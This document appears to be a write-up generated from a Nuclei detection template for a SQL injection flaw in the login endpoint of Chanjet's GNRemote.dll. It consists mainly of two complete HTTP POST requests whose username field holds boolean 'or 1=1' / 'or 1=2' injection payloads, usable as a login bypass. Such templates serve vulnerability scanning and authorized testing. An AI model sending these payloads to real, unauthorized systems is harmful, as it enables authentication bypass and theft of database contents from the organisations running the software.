# Nuclei Template: Changjietong Remote Communication GNRemote.dll - SQL Injection
**Template ID:** chanjet-gnremote-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`chanjet-gnremote-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Chanjetong has a SQL injection vulnerability, which can be used by attackers to obtain sensitive information in the database.

## Steps to reproduce / Exploit Payload
```http
POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1

POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=%22'%20or%201%3d2%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/90103c248a2c52bb0a060d0ee95d5a67e4579c3d/docs/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%20GNRemote.dll%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
